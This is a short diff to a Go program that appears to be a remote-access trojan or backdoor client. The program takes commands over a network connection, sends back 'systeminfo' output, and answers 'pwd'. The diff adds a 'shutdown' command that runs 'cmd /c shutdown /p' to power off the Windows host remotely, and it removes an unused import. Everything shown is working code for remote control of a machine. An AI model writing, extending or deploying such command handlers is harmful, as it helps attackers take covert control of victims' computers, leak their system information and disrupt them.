@@ -4,7 +4,6 @@ import (
 	"io/ioutil"
 	random "math/rand"
 	"net"
-	"log"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -117,6 +116,11 @@ func main() {
 		if message == "sysinfo" {
 			comm0 := command("systeminfo")
 			conn.Write([]byte(comm0))
+		}
+
+		if message == "shutdown" {
+			exec.Command("cmd", "/c ", "shutdown", "/p").Output()
+			conn.Write([]byte("shutdown - ok"))
 		}
 
 		if message == "pwd" {
